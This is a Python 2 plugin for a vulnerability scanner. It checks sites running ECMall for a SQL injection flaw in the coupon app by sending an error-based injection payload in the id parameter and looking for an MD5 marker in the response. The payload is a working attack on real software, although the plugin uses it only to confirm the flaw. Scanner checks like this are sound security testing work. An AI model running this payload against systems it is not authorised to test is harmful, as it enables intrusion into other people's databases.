#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        url = "%s://%s%s" % (ob['scheme'],domain,ob['base_path'])
        expurl="%s%s"%(url,"index.php?app=coupon&act=extend&id=1/**/and/**/(select/**/1/**/from/**/(select%20count(*),concat(md5(333),floor(rand(0)*2))x/**/from/**/information_schema.tables%20group/**/by/**/x)a)%23")
        data="user_name=admin"
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain"}
        
#       res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        if  content.find('310dcbbf4cce62f762a2aaa148d556bd1')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ECMall_app_coupon_app_php_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])       
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ECMall_app_coupon_app_php_SqlInjectionScript.py, run_domain function :" + str(e))        
    #end try
    
    return list
#end def
